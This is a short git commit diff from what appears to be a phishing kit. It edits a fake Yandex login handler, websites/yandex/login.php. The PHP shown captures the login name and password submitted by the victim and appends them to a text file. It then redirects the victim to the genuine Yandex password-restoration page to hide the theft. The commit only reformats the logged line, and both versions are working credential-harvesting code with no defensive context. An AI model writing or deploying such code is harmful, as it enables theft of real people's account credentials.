09de17bb973255ab4ac097388c4b615e0f7abff3
Tahmid Rayat <56682134+htr-tech@users.noreply.github.com>
2019-11-27 21:20:02 +0600

    Update login.php

--- websites/yandex/login.php
+++ websites/yandex/login.php
@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "Yandex :- Username : " . $_POST['login'] . "  ||  Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Username: " . $_POST['login'] . " Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
 header('Location: https://passport.yandex.com/restoration');
 exit();
